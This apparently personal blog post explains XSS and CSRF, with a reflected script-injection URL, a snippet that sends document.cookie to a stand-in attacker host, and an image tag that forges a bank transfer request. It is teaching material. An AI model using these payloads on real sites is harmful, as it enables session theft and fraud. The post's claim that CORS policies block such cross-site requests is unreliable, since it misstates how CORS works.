Recently I was working on some identity managment projects. During the investigation, I reviewed some security knowledge and found myself didn't tell three basic concepts quite well. Sometimes, I felt hard to remeber the exact scenarios of them and would misuse one of them to describe the scenario which should be another one. The three terminologies are XSS (Cross-site scripting), CSRF (Cross-site request forgery), CORS (Cross-origin resource sharing).

## **XSS (Cross-site scripting)**
Two of the most common attacks against websites and web application are XSS and CSRF. 

```
In case of XSS, the victims's trust for a website is exploited, in case of CSRF, the website's trust for a victim's browser is exploited.
```

In case of XSS, attacker would make the victim to execute a piece of injected script. Since the script would be run under the website domain which is trusted by the victim, the attacker can utlize this script to collect some information, such as cookies, and then send these sensitive information to attacker's website. 

Imagine there was a website that provides a search box and it would generate a query url as following based on the content in it each time you click the search button.

```
https://example.com/search?query=<SearchContent>
```

It works well if the search content is just some normal key words. But what if the search content is a script like following? 

```
https://example.com/search?query=<script>alert(1)</script>
```

The script can be executed in the trusted website's domain. We just emit an alert in this script, a worse case could be an injected script to collect and send user cookies like following.

```
<script>
new Image().src="http://attackerurl.com/storecookie?cookie="+document.cookie;
</script>
```

To mitigate this issue, **HTTPOnly** cookie attribute can be used to prevent access to the cookie value through JavaScript.

How could the attacker inject his script to a trusted website? This [post][2] provides some practical scenarios of the XSS attack. 


## **CSRF (Cross-site request forgery)**
In case of CSRF, attacker would try to let browser send a request to an honest website on behalf of the victim. If the victim has already logged in the honest website, these kinds of requests may get some sensitive information of the victim. 

Imagine the victim has already logged in the honest website "www.bank.com", and there was a attcker's website "www.attacker.com" whose content is 

```
<img src="https://www.bank.com/action=transfer&receiver=attacker">
```

Since the victim has already logged in, this request might be send to "www.bank.com" with victim's credentials in the cookies. Then "www.bank.com" would recognize this request is sent on behalf of the victim although it is a cross-site request. [CSRF token][4] can be used to somehow mitigate the CSRF issue.

To mitigate this issue, we could use some CORS(Cross-origin resource sharing) polices which prevents the cross-site request.

## **Difference between XSS and CSRF**
As above mentioned, the method to distinguish XSS and CSRF is to figure out whose trust is exploited.    

For XSS, the attacker utilizes the user's trust on the website to collect some information, the battle field is the domain of the trusted website. The attacker's injected piece of javascript code can collect the user's information in cookies of the trusted website.   

For CSRF, the attacker utilizes the user's trust on the browser. The battle field is the domain of the attacker website. The attacker gets around of the [SOP][5] and sends requests to the trusted website domain with user's cookies.
